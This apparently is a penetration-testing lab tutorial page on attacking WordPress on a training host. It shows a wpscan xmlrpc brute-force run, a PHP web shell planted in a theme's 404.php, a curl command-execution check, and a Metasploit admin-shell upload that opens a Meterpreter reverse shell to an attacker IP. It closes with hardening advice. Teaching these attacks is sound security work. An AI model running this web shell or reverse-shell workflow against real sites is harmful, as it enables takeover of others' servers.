+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http:/</span>/blog.inlanefreight.com
+
+[+] <span class="hljs-string">URL:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.com/                                                  </span>
+[+] <span class="hljs-string">Started:</span> Thu Apr  <span class="hljs-number">9</span> <span class="hljs-number">13</span>:<span class="hljs-number">37</span>:<span class="hljs-number">36</span> <span class="hljs-number">2020</span>                                                                                                                                               
+[+] Performing password attack on Xmlrpc against <span class="hljs-number">3</span> user/s
+
+[SUCCESS] - admin / sunshine1
+Trying david <span class="hljs-regexp">/ Spring2016 Time: 00:00:01 &lt;============&gt; (474 /</span> <span class="hljs-number">474</span>) <span class="hljs-number">100.00</span>% <span class="hljs-string">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>
+
+[i] Valid Combinations <span class="hljs-string">Found:</span>
+ | <span class="hljs-string">Username:</span> admin, <span class="hljs-string">Password:</span> sunshine1
+</code></pre>
+<h2 id="remote-code-execution-rce-via-the-theme-editor">Remote Code Execution (RCE) via the Theme Editor</h2>
+<hr>
+<h3 id="attacking-the-wordpress-backend">Attacking the WordPress Backend</h3>
+<p>With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on <code>Appearance</code> on the side panel and select <code>Theme Editor</code>. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.</p>
+<p><strong>Theme Editor</strong></p>
+<p><img src="storage\modules\17\Theme-Editor.png" alt="image"></p>
+<p>We can see that the active theme is <code>Transportex</code> so an unused theme such as <code>Twenty Seventeen</code> should be chosen instead.</p>
+<p><strong>Selecting Theme</strong></p>
+<p><img src="storage\modules\17\Twenty-Seventeen.png" alt="image"></p>
+<p>Choose a theme and click on <code>Select</code>. Next, choose a non-critical file such as <code>404.php</code> to modify and add a web shell.</p>
+<p><strong>Twenty Seventeen Theme - 404.php</strong></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+system($_GET[<span class="hljs-string">'cmd'</span>]);
+
+<span class="hljs-comment">/**
+ * The template for displaying 404 pages (not found)
+ *
+ * <span class="hljs-doctag">@link</span> https://codex.wordpress.org/Creating_an_Error_404_Page
+&lt;SNIP&gt;</span>
+</code></pre>
+<p>The above code should allow us to execute commands via the GET parameter <code>cmd</code>. In this example, we modified the source code of the <code>404.php</code> page and added a new function called <code>system()</code>. This function will allow us to directly execute operating system commands by sending a GET request and appending the <code>cmd</code> parameter to the end of the URL after a question mark <code>?</code> and specifying an operating system command. The modified URL should look like this <code>404.php?cmd=id</code>.</p>
+<p>We can validate that we have achieved RCE by entering the URL into the web browser or issuing the <code>cURL</code> request below.</p>
+<p><strong>RCE</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -<span class="hljs-keyword">X</span> GET <span class="hljs-string">"http://&lt;target&gt;/wp-content/themes/twentyseventeen/404.php?cmd=id"</span>
+
+uid=<span class="hljs-number">1000</span>(<span class="hljs-keyword">wp</span>-user) gid=<span class="hljs-number">1000</span>(<span class="hljs-keyword">wp</span>-user) groups=<span class="hljs-number">1000</span>(<span class="hljs-keyword">wp</span>-user)
+<span class="hljs-symbol">&lt;SNIP&gt;</span>
+</code></pre>
+<h2 id="attacking-wordpress-with-metasploit">Attacking WordPress with Metasploit</h2>
+<hr>
+<h3 id="automating-wordpress-exploitation">Automating WordPress Exploitation</h3>
+<p>We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.</p>
+<p>We can quickly start <code>MSF</code> by issuing the following command:</p>
+<p><strong>Starting Metasploit Framework</strong></p>
+<p>Attacking WordPress with Metasploit</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ msfconsole
+</code></pre>
+<hr>
+<p>To obtain the reverse shell, we can use the <code>wp_admin_shell_upload</code> module. We can easily search for it inside <code>MSF</code>:</p>
+<p><strong>MSF Search</strong></p>
+<p>Attacking WordPress with Metasploit</p>
+<pre><code class="lang-shell-session">msf5 &gt; search wp<span class="hljs-emphasis">_admin
+
+</span><span class="hljs-section">Matching Modules
+================</span>
+
+#  Name                                       Disclosure Date  Rank       Check  Description
+<span class="hljs-bullet">-  </span>----                                       ---------------  ----       -----  -----------
+0  exploit/unix/webapp/wp<span class="hljs-emphasis">_admin_</span>shell<span class="hljs-emphasis">_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload</span>
+</code></pre>
+<p>The number <code>0</code> in the search results represents the ID for the suggested modules. From here on, we can specify the module by its ID number to save time.</p>
+<p><strong>Module Selection</strong></p>
+<p>Attacking WordPress with Metasploit</p>
+<pre><code class="lang-shell-session">msf5 &gt; use <span class="hljs-number">0</span>
+
+msf5 exploit(<span class="hljs-name">unix/webapp/wp_admin_shell_upload</span>) &gt;
+</code></pre>
+<hr>
+<p><strong>Module Options</strong></p>
+<p>Each module offers different settings options that we can use to assign precise specifications to <code>MSF</code> to ensure the attack's success. We can list these options by issuing the following command:</p>
+<p><strong>List Options</strong></p>
+<p>Attacking WordPress with Metasploit</p>
+<pre><code class="lang-shell-session">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+Name       Current Setting  Required  Description
+<span class="hljs-comment">----       ---------------  --------  -----------</span>
+PASSWORD                    yes       The WordPress password <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
+Proxies                     no        A proxy chain <span class="hljs-keyword">of</span> format <span class="hljs-keyword">type</span>:host:<span class="hljs-keyword">port</span>[,<span class="hljs-keyword">type</span>:host:<span class="hljs-keyword">port</span>][...]
+RHOSTS                      yes       The target host(s), <span class="hljs-keyword">range</span> CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> <span class="hljs-keyword">with</span> syntax <span class="hljs-symbol">'file</span>:&lt;path&gt;'
+RPORT      <span class="hljs-number">80</span>               yes       The target <span class="hljs-keyword">port</span> (TCP)
+SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
+TARGETURI  /                yes       The base path <span class="hljs-keyword">to</span> the wordpress application
+USERNAME                    yes       The WordPress username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
+VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+Id  Name
+<span class="hljs-comment">--  ----</span>
+<span class="hljs-number">0</span>   WordPress
+</code></pre>
+<hr>
+<h3 id="exploitation">Exploitation</h3>
+<p>After using the <code>set</code> command to make the necessary modifications, we can use the <code>run</code> command to execute the module. If all of our parameters are set correctly, it will spawn a reverse shell on the target upon execution.</p>
+<p><strong>Set Options</strong></p>
+<p>Attacking WordPress with Metasploit</p>
+<pre><code class="lang-shell-session">msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">blog.inlanefreight.com</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set username admin</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set password Winter2020</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set lhost 10.10.16.8</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; run</span>
+
+[*] Started <span class="hljs-comment">reverse TCP handler on 10.10.16.8z4444</span>
+[*] Authenticating <span class="hljs-comment">with WordPress using admin:Winter202@...</span>
+[+] Authenticated <span class="hljs-comment">with WordPress</span>
+[*] Uploading <span class="hljs-comment">payload...</span>
+[*] Executing <span class="hljs-comment">the payload at</span> /wp—content/<span class="hljs-comment">plugins</span>/YtyZGFIhax/<span class="hljs-comment">uTvAAKrAdp.php...</span>
+[*] Sending <span class="hljs-comment">stage (38247 bytes) to blog.inlanefreight.com</span>
+[*] Meterpreter <span class="hljs-comment">session 1 opened</span>
+[+] Deleted <span class="hljs-comment">uTvAAKrAdp.php</span>
+
+meterpreter <span class="hljs-comment">&gt; getuid</span>
+Server <span class="hljs-comment">username: www</span>—<span class="hljs-comment">data (33)</span>
+</code></pre>
+<h2 id="wordpress-hardening">WordPress Hardening</h2>
+<hr>
+<h3 id="best-practices">Best Practices</h3>
+<p>Below are some best practices for preventing attacks against a WordPress site.</p>
+<hr>
+<h3 id="perform-regular-updates">Perform Regular Updates</h3>
+<p>This is a key principle for any application or system and can greatly reduce the risk of a successful attack. Make sure that WordPress core, as well as all installed plugins and themes, are kept up-to-date. Researchers continuously find flaws in third-party WordPress plugins. Some hosting providers will even perform continuous automatic updates of WordPress core. The WordPress admin console will usually prompt us when plugins or themes need to be updated or when WordPress itself requires an upgrade. We can even modify the <code>wp-config.php</code> file to enable automatic updates by inserting the following lines:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'WP_AUTO_UPDATE_CORE'</span>, <span class="hljs-literal">true</span> );
+</code></pre>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-selector-tag">add_filter</span>( <span class="hljs-string">'auto_update_plugin'</span>, <span class="hljs-string">'__return_true'</span> );
+</code></pre>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-selector-tag">add_filter</span>( <span class="hljs-string">'auto_update_theme'</span>, <span class="hljs-string">'__return_true'</span> );
+</code></pre>
+<hr>
+<h3 id="plugin-and-theme-management">Plugin and Theme Management</h3>
+<p>Only install trusted themes and plugins from the WordPress.org website. Before installing a plugin or theme, check its reviews, popularity, number of installs, and last update date. If either has not been updated in years, it could be a sign that it is no longer maintained and may suffer from unpatched vulnerabilities. Routinely audit your WordPress site and remove any unused themes and plugins. This will help to ensure that no outdated plugins are left forgotten and potentially vulnerable.</p>
+<hr>
+<h3 id="enhance-wordpress-security">Enhance WordPress Security</h3>
+<p>Several WordPress security plugins can be used to enhance the website's security. These plugins can be used as a Web Application Firewall (WAF), a malware scanner, monitoring, activity auditing, brute force attack prevention, and strong password enforcement for users. Here are a few examples of popular WordPress security plugins.</p>
+<p><a href="https://wordpress.org/plugins/sucuri-scanner/"><strong>Sucuri Security</strong></a></p>
+<ul>
+<li>This plugin is a security suite consisting of the following features:<ul>
+<li>Security Activity Auditing</li>
+<li>File Integrity Monitoring</li>
+<li>Remote Malware Scanning</li>
+<li>Blacklist Monitoring.</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://wordpress.org/plugins/better-wp-security/"><strong>iThemes Security</strong></a></p>
+<ul>
+<li>iThemes Security provides 30+ ways to secure and protect a WordPress site such as:<ul>
+<li>Two-Factor Authentication (2FA)</li>
+<li>WordPress Salts &amp; Security Keys</li>
+<li>Google reCAPTCHA</li>
+<li>User Action Logging</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://wordpress.org/plugins/wordfence/"><strong>Wordfence Security</strong></a></p>
+<ul>
+<li>Wordfence Security consists of an endpoint firewall and malware scanner.<ul>
+<li>The WAF identifies and blocks malicious traffic.</li>
+<li>The premium version provides real-time firewall rule and malware signature updates</li>
+<li>Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="user-management">User Management</h3>
+<p>Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site.</p>
+<ul>
+<li>Disable the standard <code>admin</code> user and create accounts with difficult to guess usernames</li>
+<li>Enforce strong passwords</li>
+<li>Enable and enforce two-factor authentication (2FA) for all users</li>
+<li>Restrict users' access based on the concept of least privilege</li>
+<li>Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed</li>
+</ul>
+<hr>
+<h3 id="configuration-management">Configuration Management</h3>
+<p>Certain configuration changes can increase the overall security posture of a WordPress installation.</p>
+<ul>
+<li>Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack</li>
+<li>Limit login attempts to prevent password brute-forcing attacks</li>
+<li>Rename the <code>wp-admin.php</code> login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses</li>
+</ul>
+</div></body></html>
